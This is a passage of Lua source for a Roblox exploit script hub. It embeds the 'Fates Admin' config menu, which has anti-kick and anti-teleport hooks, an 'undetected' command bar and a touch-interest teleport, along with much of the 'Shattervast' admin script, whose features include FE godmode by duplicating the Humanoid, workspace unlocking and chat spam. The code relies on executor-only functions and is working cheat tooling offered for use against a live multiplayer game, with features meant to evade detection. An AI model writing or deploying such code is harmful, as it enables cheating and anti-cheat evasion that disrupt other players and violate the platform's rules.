				return format("%s + %s", IsEnum2 and KeyName2 or KeyName, IsEnum2 and KeyName2 or KeyName2);
			end
			return KeyName
		end

		LoadConfig = function()
			local Script = ConfigUILib.NewPage("Script");
			local Settings = Script.NewSection("Settings");

			local CurrentConf = GetConfig();
			UndetectedCmdBar = CurrentConf.UndetectedCmdBar


			Settings.TextboxKeybind("Chat Prefix", Prefix, function(Key)
				if (not match(Key, "%A") or match(Key, "%d") or #Key > 1) then
					Utils.Notify(nil, "Prefix", "Prefix must be a 1 character symbol.");
					return
				end
				Prefix = Key
				Utils.Notify(nil, "Prefix", "Prefix is now " .. Key);
			end)

			Settings.Keybind("CMDBar Prefix", GetKeyName(CommandBarPrefix), function(KeyCode1, KeyCode2)
				CommandBarPrefix = KeyCode1
				Utils.Notify(nil, "Prefix", "CommandBar Prefix is now " .. GetKeyName(KeyCode1));
			end)

			local ToggleSave;
			ToggleSave = Settings.Toggle("Save Prefix's", false, function(Callback)
				SetConfig({["Prefix"]=Prefix,["CommandBarPrefix"]=split(tostring(CommandBarPrefix), ".")[3]});
				wait(.5);
				ToggleSave();
				Utils.Notify(nil, "Prefix", "saved prefix's");
			end)

			local Misc = Script.NewSection("Misc");

			Misc.Toggle("Chat Prediction", CurrentConf.ChatPrediction or false, function(Callback)
				local ChatBar = ToggleChatPrediction();
				if (Callback) then
					ChatBar.CaptureFocus(ChatBar);
					wait();
					ChatBar.Text = Prefix
				end
				SetConfig({ChatPrediction=Callback});
				Utils.Notify(nil, nil, format("ChatPrediction %s", Callback and "enabled" or "disabled"));
			end)

			Misc.Toggle("Undetected CommandBar", UndetectedCmdBar, function(Callback)
				SetConfig({UndetectedCmdBar=Callback});
			end)

			Misc.Toggle("Anti Kick", Hooks.AntiKick, function(Callback)
				Hooks.AntiKick = Callback
				Utils.Notify(nil, nil, format("AntiKick %s", Hooks.AntiKick and "enabled" or "disabled"));
			end)

			Misc.Toggle("Anti Teleport", Hooks.AntiTeleport, function(Callback)
				Hooks.AntiTeleport = Callback
				Utils.Notify(nil, nil, format("AntiTeleport %s", Hooks.AntiTeleport and "enabled" or "disabled"));
			end)

			Misc.Toggle("wide cmdbar", WideBar, function(Callback)
				WideBar = Callback
				if (not Draggable) then
					Utils.Tween(CommandBar, "Quint", "Out", .5, {
						Position = UDim2.new(0.5, WideBar and -200 or -100, 1, 5) -- tween -110
					})
				end
				Utils.Tween(CommandBar, "Quint", "Out", .5, {
					Size = UDim2.new(0, WideBar and 400 or 200, 0, 35) -- tween -110
				})
				SetConfig({WideBar=Callback});
				Utils.Notify(nil, nil, format("widebar %s", WideBar and "enabled" or "disabled"));
			end)

			Misc.Toggle("draggable cmdbar", Draggable, function(Callback)
				Draggable = Callback
				CommandBarOpen = true
				Utils.Tween(CommandBar, "Quint", "Out", .5, {
					Position = UDim2.new(0, Mouse.X, 0, Mouse.Y + 36);
				})
				Utils.Draggable(CommandBar);
				local TransparencyTween = CommandBarOpen and Utils.TweenAllTransToObject or Utils.TweenAllTrans
				local Tween = TransparencyTween(CommandBar, .5, CommandBarTransparencyClone);
				CommandBar.Input.Text = ""
				if (not Callback) then
					Utils.Tween(CommandBar, "Quint", "Out", .5, {
						Position = UDim2.new(0.5, WideBar and -200 or -100, 1, 5) -- tween 5
					})
				end
				Utils.Notify(nil, nil, format("draggable command bar %s", Draggable and "enabled" or "disabled"));
			end)

			Misc.Toggle("KillCam when killing", CurrentConf.KillCam, function(Callback)
				SetConfig({KillCam=Callback});
				_L.KillCam = Callback
			end)

			local OldFireTouchInterest = firetouchinterest
			Misc.Toggle("cframe touchinterest", firetouchinterest == nil, function(Callback)
				firetouchinterest = Callback and function(part1, part2, toggle)
					if (part1 and part2) then
						if (toggle == 0) then
							touched[1] = part1.CFrame
							part1.CFrame = part2.CFrame
						else
							part1.CFrame = touched[1]
							touched[1] = nil
						end
					end
				end or OldFireTouchInterest
			end)

			local MacrosPage = ConfigUILib.NewPage("Macros");
			local MacroSection;
			MacroSection = MacrosPage.CreateMacroSection(Macros, function(Bind, Command, Args)
				local AlreadyAdded = false
				for i = 1, #Macros do
					if (Macros[i].Command == Command) then
						AlreadyAdded = true
					end
				end
				if (CommandsTable[Command] and not AlreadyAdded) then
					MacroSection.AddMacro(Command .. " " .. Args, SortKeys(Bind[1], Bind[2]));
					Args = split(Args, " ");
					if (sub(Command, 1, 2) == "un" or CommandsTable["un" .. Command]) then
						local Shifted = {Command, unpack(Args)}
						Macros[#Macros + 1] = {
							Command = "toggle",
							Args = Shifted,
							Keys = Bind
						}
					else
						Macros[#Macros + 1] = {
							Command = Command,
							Args = Args,
							Keys = Bind
						}
					end
					local TempMacros = clone(Macros);
					for i, v in next, TempMacros do
						for i2, v2 in next, v.Keys do
							TempMacros[i]["Keys"][i2] = split(tostring(v2), ".")[3]
						end
					end
					SetConfig({Macros=TempMacros});
				end
			end)
			local UIListLayout = MacroSection.CommandsList.UIListLayout
			for i, v in next, CommandsTable do
				if (not FindFirstChild(MacroSection.CommandsList, v.Name)) then
					MacroSection.AddCmd(v.Name);
				end
			end
			MacroSection.CommandsList.CanvasSize = UDim2.fromOffset(0, UIListLayout.AbsoluteContentSize.Y);
			local Search = FindFirstChild(MacroSection.CommandsList.Parent.Parent, "Search");

			AddConnection(CConnect(GetPropertyChangedSignal(Search, "Text"), function()
				local Text = Search.Text
				for _, v in next, GetChildren(MacroSection.CommandsList) do
					if (IsA(v, "TextButton")) then
						local Command = v.Text
						v.Visible = Sfind(lower(Command), Text, 1, true)
					end
				end
				MacroSection.CommandsList.CanvasSize = UDim2.fromOffset(0, UIListLayout.AbsoluteContentSize.Y);
			end), Connections.UI, true);

			local PluginsPage = ConfigUILib.NewPage("Plugins");

			local CurrentPlugins = PluginsPage.NewSection("Current Plugins");
			local PluginSettings = PluginsPage.NewSection("Plugin Settings");

			local CurrentPluginConf = GetPluginConfig();

			CurrentPlugins.ScrollingFrame("plugins", function(Option, Enabled)
				CurrentPluginConf = GetPluginConfig();
				for i = 1, #Plugins do
					local Plugin = Plugins[i]
					if (Plugin[1] == Option) then
						local DisabledPlugins = CurrentPluginConf.DisabledPlugins
						local PluginName = Plugin[2]().Name
						if (Enabled) then
							DisabledPlugins[PluginName] = nil
							SetPluginConfig({DisabledPlugins=DisabledPlugins});
							Utils.Notify(nil, "Plugin Enabled", format("plugin %s successfully enabled", PluginName));
						else
							DisabledPlugins[PluginName] = true
							SetPluginConfig({DisabledPlugins=DisabledPlugins});
							Utils.Notify(nil, "Plugin Disabled", format("plugin %s successfully disabled", PluginName));
						end
					end
				end
			end, map(Plugins, function(Key, Plugin)
				return not PluginConf.DisabledPlugins[Plugin[2]().Name], Plugin[1]
			end));

			PluginSettings.Toggle("Plugins Enabled", CurrentPluginConf.PluginsEnabled, function(Callback)
				SetPluginConfig({PluginsEnabled = Callback});
			end)

			PluginSettings.Toggle("Plugins Debug", CurrentPluginConf.PluginDebug, function(Callback)
				SetPluginConfig({PluginDebug = Callback});
			end)

			PluginSettings.Toggle("Safe Plugins", CurrentPluginConf.SafePlugins, function(Callback)
				SetPluginConfig({SafePlugins = Callback});
			end)

			local Themes = ConfigUILib.NewPage("Themes");

			local Color = Themes.NewSection("Colors");
			local Options = Themes.NewSection("Options");

			local RainbowEnabled = false
			Color.ColorPicker("All Background", UITheme.Background.BackgroundColor, function(Callback, IsRainbow)
				UITheme.Background.BackgroundColor = Callback
				RainbowEnabled = IsRainbow
			end)
			Color.ColorPicker("CommandBar", UITheme.CommandBar.BackgroundColor, function(Callback)
				if (not RainbowEnabled) then
					UITheme.CommandBar.BackgroundColor = Callback
				end
			end)
			Color.ColorPicker("Notification", UITheme.Notification.BackgroundColor, function(Callback)
				if (not RainbowEnabled) then
					UITheme.Notification.BackgroundColor = Callback
				end
			end)
			Color.ColorPicker("ChatLogs", UITheme.ChatLogs.BackgroundColor, function(Callback)
				if (not RainbowEnabled) then
					UITheme.ChatLogs.BackgroundColor = Callback
				end
			end)
			Color.ColorPicker("CommandList", UITheme.CommandList.BackgroundColor, function(Callback)
				if (not RainbowEnabled) then
					UITheme.CommandList.BackgroundColor = Callback
				end
			end)
			Color.ColorPicker("Config", UITheme.Config.BackgroundColor, function(Callback)
				if (not RainbowEnabled) then
					UITheme.Config.BackgroundColor = Callback
				end
			end)

			Color.ColorPicker("All Text", UITheme.Background.TextColor, function(Callback)
				UITheme.Background.TextColor = Callback
			end)

			local ToggleSave;
			ToggleSave = Options.Toggle("Save Theme", false, function(Callback)
				WriteThemeConfig();
				wait(.5);
				ToggleSave();
				Utils.Notify(nil, "Theme", "saved theme");
			end)

			local ToggleLoad;
			ToggleLoad = Options.Toggle("Load Theme", false, function(Callback)
				LoadTheme(GetThemeConfig());
				wait(.5);
				ToggleLoad();
				Utils.Notify(nil, "Theme", "Loaded theme");
			end)

			local ToggleReset;
			ToggleReset = Options.Toggle("Reset Theme", false, function(Callback)
				UITheme.Background.BackgroundColor = "Reset"
				UITheme.Notification.TextColor = "Reset"
				UITheme.CommandBar.TextColor = "Reset"
				UITheme.CommandList.TextColor = "Reset"
				UITheme.ChatLogs.TextColor = "Reset"
				UITheme.Config.TextColor = "Reset"
				UITheme.Notification.Transparency = "Reset"
				UITheme.CommandBar.Transparency = "Reset"
				UITheme.CommandList.Transparency = "Reset"
				UITheme.ChatLogs.Transparency = "Reset"
				UITheme.Config.Transparency = "Reset"
				wait(.5);
				ToggleReset();
				Utils.Notify(nil, "Theme", "reset theme");
			end)

		end

		delay(1, function()
			for i = 1, #Macros do
				local Macro = Macros[i]
				for i2 = 1, #Macro.Keys do
					Macros[i].Keys[i2] = Enum.KeyCode[Macros[i].Keys[i2]]
				end
			end
			if (CurrentConfig.WideBar) then
				WideBar = true
				Utils.Tween(CommandBar, "Quint", "Out", .5, {
					Size = UDim2.new(0, WideBar and 400 or 200, 0, 35) -- tween -110
				})
			end
			KillCam = CurrentConfig.KillCam
			local Aliases = CurrentConfig.Aliases
			if (Aliases) then
				for i, v in next, Aliases do
					if (CommandsTable[i]) then
						for i2 = 1, #v do
							local Alias = v[i2]
							local Add = CommandsTable[i]
							Add.Name = Alias
							CommandsTable[Alias] = Add
						end
					end
				end
			end
		end)
	end
	--END IMPORT [config]


	AddConnection(CConnect(CommandBar.Input.FocusLost, function()
		if (UndetectedCmdBar) then
			CThread(function()
				wait(.3);
				for i, v in next, getconnections(Services.UserInputService.TextBoxFocusReleased) do
					v.Enable(v);
				end
			end)()
		end

		local Text = trim(CommandBar.Input.Text);
		local CommandArgs = split(Text, " ");

		CommandBarOpen = false

		if (not Draggable) then
			Utils.TweenAllTrans(CommandBar, .5)
			Utils.Tween(CommandBar, "Quint", "Out", .5, {
				Position = UDim2.new(0.5, WideBar and -200 or -100, 1, 5); -- tween 5
			})
		end

		local Command = CommandArgs[1]
		local Args = shift(CommandArgs);

		if (Command ~= "") then
			ExecuteCommand(Command, Args, LocalPlayer);
		end
	end), Connections.UI, true);

	local PlayerAdded = function(plr)
		RespawnTimes[plr.Name] = tick();
		AddConnection(CConnect(plr.CharacterAdded, function()
			RespawnTimes[plr.Name] = tick();
		end));
	end

	forEach(GetPlayers(Players), function(i,v)
		PlrChat(i,v);
		PlayerAdded(v);
	end);

	AddConnection(CConnect(Players.PlayerAdded, function(plr)
		PlrChat(#Connections.Players + 1, plr);
		PlayerAdded(plr);
	end))

	AddConnection(CConnect(Players.PlayerRemoving, function(plr)
		if (Connections.Players[plr.Name]) then
			if (Connections.Players[plr.Name].ChatCon) then
				Disconnect(Connections.Players[plr.Name].ChatCon);
			end
			Connections.Players[plr.Name] = nil
		end
		if (RespawnTimes[plr.Name]) then
			RespawnTimes[plr.Name] = nil
		end
	end))

	getgenv().F_A = {
		Utils = Utils,
		PluginLibrary = PluginLibrary,
		GetConfig = GetConfig
	}

	Utils.Notify(LocalPlayer, "Loaded", format("script loaded in %.3f seconds", (tick()) - _L.start));
	Utils.Notify(LocalPlayer, "Welcome", "'cmds' to see all of the commands, 'config' to customise the script");
	if (debug.info(2, "f") == nil) then
		Utils.Notify(LocalPlayer, "Outdated Script", "use the loadstring to get latest updates (https://fatesc/fates-admin)", 10);
	end
	_L.LatestCommit = JSONDecode(Services.HttpService, game.HttpGetAsync(game, "https://api.github.com/repos/fatesc/fates-admin/commits?per_page=1&path=main.lua"))[1]
	wait(1);
	Utils.Notify(LocalPlayer, "Newest Update", format("%s - %s", _L.LatestCommit.commit.message, _L.LatestCommit.commit.author.name));
end)

UICorner_52.Parent = FateAdmin

Shattervast.Name = "Shattervast"
Shattervast.Parent = Scripts
Shattervast.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Shattervast.Position = UDim2.new(0.282868534, 0, 0.627378941, 0)
Shattervast.Size = UDim2.new(0, 71, 0, 50)
Shattervast.Font = Enum.Font.SciFi
Shattervast.Text = "Shatter vast"
Shattervast.TextColor3 = Color3.fromRGB(0, 0, 0)
Shattervast.TextSize = 23.000
Shattervast.TextWrapped = true
Shattervast.MouseButton1Click:connect(function()
	-- Have Fun!
	-- IT FUCKING TAKE MY SELF 1 HOUR TO RESCRIPT THIS CAUSE SKISPLOIT CANT RUN THE FUCKING COREGUI
	-- Re script by Alex games #9120
	-- By illremember#3799

	-- Important Loading
	trueSettings = {
		commandPrefix = ";";
		hotkeys = {};
		fchotkeymode = "unfc";
	}

	-- Important Variables
	gsPlayers = game:GetService("Players")
	gsWorkspace = game:GetService("Workspace")
	gsLighting = game:GetService("Lighting")
	gsReplicatedStorage = game:GetService("ReplicatedStorage")
	gsCoreGui = game:GetService("CoreGui")
	gsTween = game:GetService("TweenService")
	gsHttp = game:GetService("HttpService")

	LP = gsPlayers.LocalPlayer
	Mouse = LP:GetMouse()

	defaultSettings = gsHttp:JSONEncode(trueSettings)
	function CreateSave()
		writefile("Shattervast.txt", defaultSettings)
		wait(0.5)
		local content = readfile("Shattervast.txt")
		local trueValue = gsHttp:JSONDecode(content)
		commandPrefix = trueValue.commandPrefix
		hotkeys = trueValue.hotkeys
		fchotkeymode = trueValue.fchotkeymode
	end
	function fullUpdate()
		local updatedSettings = {
			commandPrefix = commandPrefix;
			hotkeys = hotkeys;
			fchotkeymode = fchotkeymode;
		}
		local fullUPDATED = gsHttp:JSONEncode(updatedSettings)
		wait(0.2)
		writefile("Shattervast.txt", fullUPDATED)
	end
	if writefile ~= nil then
		function builder()
			local TESTsave = readfile("Shattervast.txt")
			if TESTsave == nil then
				return false
			else
				return true
			end
		end
		local success, message = pcall(builder)
		if success == true then
			function reader()
				local content = readfile("Shattervast.txt")
				local trueValue = gsHttp:JSONDecode(content)
				commandPrefix = trueValue.commandPrefix
				hotkeys = trueValue.hotkeys
				if trueValue.fchotkeymode == nil then
					fchotkeymode = "unfc"
					fullUpdate()
				else
					fchotkeymode = trueValue.fchotkeymode
				end
			end
			reader()
		elseif success == false then
			CreateSave()
		end
	else
		commandPrefix = ";"
		hotkeys = {}
		fchotkeymode = "unfc"
	end

	CurrentGravity = gsWorkspace.Gravity
	CurrentWalkspeed = LP.Character.Humanoid.WalkSpeed
	CurrentJumppower = LP.Character.Humanoid.JumpPower
	CurrentHipheight = LP.Character.Humanoid.HipHeight
	CurrentNormal = LP.DevCameraOcclusionMode

	gsWorkspace.Camera.Changed:Connect(function()
		gsWorkspace.Camera.FieldOfView = 70
	end)

	-- Important Functions
	function view(plr)
		if plr.Character.Humanoid ~= nil then
			gsWorkspace.CurrentCamera.CameraSubject = plr.Character.Humanoid
		else
			gsWorkspace.CurrentCamera.CameraSubject = plr.Character.Head
		end
	end
	function unlockWS()
		for i,part in pairs(gsWorkspace:GetDescendants()) do
			if part:IsA("Part") then
				part.Locked = false
			end
		end
	end
	function lockWS()
		for i,part in pairs(gsWorkspace:GetDescendants()) do
			if part:IsA("Part") then
				part.Locked = true
			end
		end
	end
	function FEGodmode()
		local changeview = false
		if gsWorkspace.CurrentCamera.CameraSubject == LP.Character.Humanoid or gsWorkspace.CurrentCamera.CameraSubject == LP.Character then
			changeview = true
		end
		LP.Character.Humanoid.Name = 1
		local l = LP.Character["1"]:Clone()
		l.Parent = LP.Character
		l.Name = "Humanoid"
		wait(0.1)
		LP.Character["1"]:Destroy()
		if changeview then
			game:GetService("Workspace").CurrentCamera.CameraSubject = LP.Character
		end
		LP.Character.Animate.Disabled = true
		wait(0.1)
		LP.Character.Animate.Disabled = false
		LP.Character.Humanoid.DisplayDistanceType = "None"
	end
	function RocketPropulsion(maxthrust,maxspeed,thrustp,targetplr,name)
		local l = Instance.new("RocketPropulsion")
		l.Parent = LP.Character.HumanoidRootPart
		l.CartoonFactor = 1
		l.MaxThrust = maxthrust
		l.MaxSpeed = maxspeed
		l.ThrustP = thrustp
		l.Name = name
		l.Target = targetplr.Character.HumanoidRootPart
		l:Fire()
	end
	function createIntro(style, msg, length)
		if gsCoreGui:FindFirstChild("Notification") then
			gsCoreGui:FindFirstChild("Notification"):Destroy()
		end
		local info = "http://www.roblox.com/asset/?id=1281284684"
		local warning = "http://www.roblox.com/asset/?id=1281286925"
		if style == "info" then
			style = info
		elseif style == "warning" then
			style = warning
		end
		local Notification = Instance.new("ScreenGui")
		local Frame = Instance.new("Frame")
		local TextLabel = Instance.new("TextLabel")
		local IMAGE = Instance.new("ImageLabel")
		Notification.Name = "Notification"
		Notification.Parent = game.Players.LocalPlayer.PlayerGui
		Notification.ResetOnSpawn = false
		Frame.Parent = Notification
		Frame.BackgroundColor3 = Color3.new(0.164706, 0.164706, 0.164706)
		Frame.BackgroundTransparency = 0.20000000298023
		Frame.BorderSizePixel = 0
		Frame.Position = UDim2.new(0, 0, -0.2, 0)
		Frame.Size = UDim2.new(1, 0, 0, 30)
		TextLabel.Parent = Frame
		TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
		TextLabel.BackgroundTransparency = 1
		TextLabel.Size = UDim2.new(1, 0, 1, 0)
		TextLabel.Font = Enum.Font.SourceSansLight
		TextLabel.Text = msg
		TextLabel.TextColor3 = Color3.new(0.905882, 0.905882, 0.905882)
		TextLabel.TextScaled = true
		TextLabel.TextSize = 14
		TextLabel.TextWrapped = true
		IMAGE.Parent = Frame
		IMAGE.BackgroundTransparency = 1
		IMAGE.Size = UDim2.new(0, 50, 0, 50)
		IMAGE.Position = UDim2.new(0.1, 0, 0, 0)
		IMAGE.Image = style
		local Intro = Instance.new("ScreenGui")
		local Frame2 = Instance.new("Frame")
		local IMAGE2 = Instance.new("ImageLabel")
		Intro.Name = "Intro"
		Intro.Parent = game.Players.LocalPlayer.PlayerGui
		Intro.ResetOnSpawn = false
		Frame2.Parent = Intro
		Frame2.BackgroundTransparency = 1
		Frame2.BorderSizePixel = 0
		Frame2.Position = UDim2.new(0, 0, -0.2, 0)
		Frame2.Size = UDim2.new(1, 0, 0, 30)
		IMAGE2.Parent = Frame
		IMAGE2.BackgroundTransparency = 1
		IMAGE2.AnchorPoint = Vector2.new(0.5, 0)
		IMAGE2.Size = UDim2.new(0, 240, 0, 120)
		IMAGE2.Position = UDim2.new(0.5, 0, 0, 0)
		IMAGE2.Image = "http://www.roblox.com/asset/?id=1795472522"
		Frame2:TweenPosition(UDim2.new(0, 0, 0, 200), "Out", "Quad", 1.5)
		Frame:TweenPosition(UDim2.new(0, 0, 0, 0), "Out", "Quad", 1.5)
		wait(length)
		pcall(function()
			Frame:TweenPosition(UDim2.new(0, 0, -1.5, 0), "Out", "Quad", 3)
			Frame2:TweenPosition(UDim2.new(0, 0, -1.5, 0), "Out", "Quad", 3)
		end)
		wait(3.01)
		Intro:Destroy()
		Notification:Destroy()
	end
	function Notification(style, msg, length)
		if gsCoreGui:FindFirstChild("Notification") then
			gsCoreGui:FindFirstChild("Notification"):Destroy()
		end
		local info = "http://www.roblox.com/asset/?id=1281284684"
		local warning = "http://www.roblox.com/asset/?id=1281286925"
		if style == "info" then
			style = info
		elseif style == "warning" then
			style = warning
		end
		local Notification = Instance.new("ScreenGui")
		local Frame = Instance.new("Frame")
		local TextLabel = Instance.new("TextLabel")
		local IMAGE = Instance.new("ImageLabel")
		Notification.Name = "Notification"
		Notification.Parent = game.Players.LocalPlayer.PlayerGui
		Notification.ResetOnSpawn = false
		Frame.Parent = Notification
		Frame.BackgroundColor3 = Color3.new(0.164706, 0.164706, 0.164706)
		Frame.BackgroundTransparency = 0.20000000298023
		Frame.BorderSizePixel = 0
		Frame.Position = UDim2.new(0, 0, -0.2, 0)
		Frame.Size = UDim2.new(1, 0, 0, 30)
		TextLabel.Parent = Frame
		TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
		TextLabel.BackgroundTransparency = 1
		TextLabel.Size = UDim2.new(1, 0, 1, 0)
		TextLabel.Font = Enum.Font.SourceSansLight
		TextLabel.Text = msg
		TextLabel.TextColor3 = Color3.new(0.905882, 0.905882, 0.905882)
		TextLabel.TextScaled = true
		TextLabel.TextSize = 14
		TextLabel.TextWrapped = true
		IMAGE.Parent = Frame
		IMAGE.BackgroundTransparency = 1
		IMAGE.Size = UDim2.new(0, 50, 0, 50)
		IMAGE.Position = UDim2.new(0.1, 0, 0, 0)
		IMAGE.Image = style
		Frame:TweenPosition(UDim2.new(0, 0, 0, 0), "Out", "Quad", 1.5)
		wait(length)
		pcall(function()
			Frame:TweenPosition(UDim2.new(0, 0, -1.5, 0), "Out", "Quad", 3)
		end)
		wait(3.01)
		Notification:Destroy()
	end
	function hasTools()
		local a = false
		local b = false
		for i,v in pairs(LP.Character:GetDescendants()) do
			if v:IsA("Tool") then
				if v ~= nil then
					a = true
				else
					a = false
				end
			end
		end
		for i,k in pairs(LP.Backpack:GetDescendants()) do
			if k:IsA("Tool") then
				if k ~= nil then
					b = true
				else
					b = false
				end
			end
		end
		return a or b
	end
	Compliments = {" is the coolest person in this server!", ", I really like your avatar!", ", I really want to be your friend!", " is truly amazing. Truly!", " is incredible!", ", you are my favourite here!!", ", I am complimenting you right now at this very moment.", " you are really awesome", " when will you be my friend!?", " is such a great person", " is a fantastic person!"}
	function complimentplr(player)
		local plrName = player.Name
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(plrName..Compliments[math.random(1, #Compliments)], "All")
	end
	function createINFO(player)
		local InfoGUIv2 = Instance.new("ScreenGui")
		local Frame = Instance.new("Frame")
		local Frame_2 = Instance.new("Frame")
		local infoguiCLOSE = Instance.new("TextButton")
		local Frame_3 = Instance.new("Frame")
		local playerName = Instance.new("TextLabel")
		local Frame_4 = Instance.new("Frame")
		local playerAvatar = Instance.new("ImageLabel")
		local playerAccAge = Instance.new("TextLabel")
		local playerId = Instance.new("TextLabel")
		local playerOs = Instance.new("TextLabel")
		local playerMembership = Instance.new("TextLabel")
		local Frame_5 = Instance.new("Frame")
		local Frame_6 = Instance.new("Frame")
		InfoGUIv2.Name = "InfoGUIv2"
		InfoGUIv2.Parent = game.Players.LocalPlayer.PlayerGui
		InfoGUIv2.ResetOnSpawn = false
		Frame.Parent = InfoGUIv2
		Frame.BackgroundColor3 = Color3.new(0, 0, 0)
		Frame.BackgroundTransparency = 1
		Frame.BorderColor3 = Color3.new(0, 0, 0)
		Frame.ClipsDescendants = true
		Frame.Position = UDim2.new(0.45, 0, 1, 0)
		Frame.Size = UDim2.new(0, 265, 0, 302)
		Frame.ZIndex = -1
		Frame_2.Parent = Frame
		Frame_2.BackgroundColor3 = Color3.new(0.290196, 0, 0.447059)
		Frame_2.BorderSizePixel = 0
		Frame_2.Size = UDim2.new(0, 260, 0, 20)
		infoguiCLOSE.Name = "infoguiCLOSE"
		infoguiCLOSE.Parent = Frame_2
		infoguiCLOSE.BackgroundColor3 = Color3.new(1, 1, 1)
		infoguiCLOSE.BackgroundTransparency = 1
		infoguiCLOSE.BorderSizePixel = 0
		infoguiCLOSE.Position = UDim2.new(0, 230, 0, 0)
		infoguiCLOSE.Size = UDim2.new(0, 30, 0, 20)
		infoguiCLOSE.Font = Enum.Font.SourceSansBold
		infoguiCLOSE.Text = "X"
		infoguiCLOSE.TextColor3 = Color3.new(0.992157, 0.992157, 0.992157)
		infoguiCLOSE.TextSize = 20
		Frame_3.Parent = Frame
		Frame_3.BackgroundColor3 = Color3.new(0.482353, 0.121569, 0.635294)
		Frame_3.BorderSizePixel = 0
		Frame_3.Position = UDim2.new(0, 0, 0, 20)
		Frame_3.Size = UDim2.new(0, 260, 0, 40)
		playerName.Name = "playerName"
		playerName.Parent = Frame_3
		playerName.BackgroundColor3 = Color3.new(1, 1, 1)
		playerName.BackgroundTransparency = 1
		playerName.Position = UDim2.new(0, 10, 0, 5)
		playerName.Size = UDim2.new(0, 240, 0, 30)
		playerName.Font = Enum.Font.SourceSansLight
		playerName.Text = player.Name
		playerName.TextColor3 = Color3.new(0.988235, 0.988235, 0.988235)
		playerName.TextScaled = true
		playerName.TextSize = 14
		playerName.TextWrapped = true
		Frame_4.Parent = Frame
		Frame_4.BackgroundColor3 = Color3.new(0.956863, 0.956863, 0.956863)
		Frame_4.BorderSizePixel = 0
		Frame_4.Position = UDim2.new(0, 0, 0, 60)
		Frame_4.Size = UDim2.new(0, 260, 0, 237)
		playerAvatar.Name = "playerAvatar"
		playerAvatar.Parent = Frame_4
		playerAvatar.BackgroundColor3 = Color3.new(1, 1, 1)
		playerAvatar.Position = UDim2.new(0, 85, 0, 10)
		playerAvatar.Size = UDim2.new(0, 85, 0, 85)
		playerAvatar.Image = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username="..player.Name
		playerAccAge.Name = "playerAccAge"
		playerAccAge.Parent = Frame_4
		playerAccAge.BackgroundColor3 = Color3.new(1, 1, 1)
		playerAccAge.BackgroundTransparency = 1
		playerAccAge.Position = UDim2.new(0, 5, 0, 101)
		playerAccAge.Size = UDim2.new(0, 250, 0, 30)
		playerAccAge.Font = Enum.Font.SourceSans
		playerAccAge.Text = "Account Age: "..player.AccountAge
		playerAccAge.TextColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
		playerAccAge.TextScaled = true
		playerAccAge.TextSize = 14
		playerAccAge.TextWrapped = true
		playerId.Name = "playerId"
		playerId.Parent = Frame_4
		playerId.BackgroundColor3 = Color3.new(1, 1, 1)
		playerId.BackgroundTransparency = 1
		playerId.Position = UDim2.new(0, 5, 0, 131)
		playerId.Size = UDim2.new(0, 250, 0, 30)
		playerId.Font = Enum.Font.SourceSans
		playerId.Text = "Account ID: "..player.UserId
		playerId.TextColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
		playerId.TextScaled = true
		playerId.TextSize = 14
		playerId.TextWrapped = true
		playerOs.Name = "playerOs"
		playerOs.Parent = Frame_4
		playerOs.BackgroundColor3 = Color3.new(1, 1, 1)
		playerOs.BackgroundTransparency = 1
		playerOs.Position = UDim2.new(0, 5, 0, 161)
		playerOs.Size = UDim2.new(0, 250, 0, 30)
		playerOs.Font = Enum.Font.SourceSansLight
		playerOs.Text = "Player OS: "..player.OsPlatform
		playerOs.TextColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
		playerOs.TextScaled = true
		playerOs.TextSize = 14
		playerOs.TextWrapped = true
		playerMembership.Name = "playerMembership"
		playerMembership.Parent = Frame_4
		playerMembership.BackgroundColor3 = Color3.new(1, 1, 1)
		playerMembership.BackgroundTransparency = 1
		playerMembership.Position = UDim2.new(0, 5, 0, 191)
		playerMembership.Size = UDim2.new(0, 250, 0, 30)
		playerMembership.Font = Enum.Font.SourceSansLight
		if player.MembershipType == Enum.MembershipType.None then
			playerMembership.Text = "No builder's club."
		elseif player.MembershipType == Enum.MembershipType.BuildersClub then
			playerMembership.Text = "Builder's club!"
		elseif player.MembershipType == Enum.MembershipType.TurboBuildersClub then
			playerMembership.Text = "Turbo Builder's club!"
		elseif player.MembershipType == Enum.MembershipType.OutrageousBuildersClub then
			playerMembership.Text = "Outrageous Builder's club!"
		end
		playerMembership.TextColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
		playerMembership.TextScaled = true
		playerMembership.TextSize = 14
		playerMembership.TextWrapped = true
		Frame_5.Parent = Frame
		Frame_5.BackgroundColor3 = Color3.new(0, 0, 0)
		Frame_5.BackgroundTransparency = 0.69999998807907
		Frame_5.BorderColor3 = Color3.new(0, 0, 0)
		Frame_5.BorderSizePixel = 0
		Frame_5.ClipsDescendants = true
		Frame_5.Position = UDim2.new(0, 10, 0, 10)
		Frame_5.Selectable = true
		Frame_5.Size = UDim2.new(0, 255, 0, 292)
		Frame_5.ZIndex = -1
		Frame_6.Parent = Frame
		Frame_6.BackgroundColor3 = Color3.new(0, 0, 0)
		Frame_6.BackgroundTransparency = 0.69999998807907
		Frame_6.BorderColor3 = Color3.new(0, 0, 0)
		Frame_6.BorderSizePixel = 0
		Frame_6.ClipsDescendants = true
		Frame_6.Position = UDim2.new(0, 8, 0, 8)
		Frame_6.Selectable = true
		Frame_6.Size = UDim2.new(0, 255, 0, 292)
		Frame_6.ZIndex = -1
		local closeGet = {}
		closeGet.Size = UDim2.new(0, 0, 0, 0)
		local openGet = {}
		openGet.Position = UDim2.new(0.45, 0, 0.45, 0)
		local closeFunction = gsTween:Create(Frame, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), closeGet)
		local openFunction = gsTween:Create(Frame, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), openGet)
		infoguiCLOSE.MouseButton1Click:Connect(function()
			closeFunction:Play()
			Frame:TweenPosition((Frame.Position + UDim2.new(0, 265 / 2, 0, 302 / 2)), "InOut", "Sine", 2)
			wait(2.01)
			Frame:Destroy()
		end)
		openFunction:Play()
		local UserInputService = game:GetService("UserInputService")
		local dragging
		local dragInput
		local dragStart
		local startPos
		local function update(input)
			local delta = input.Position - dragStart
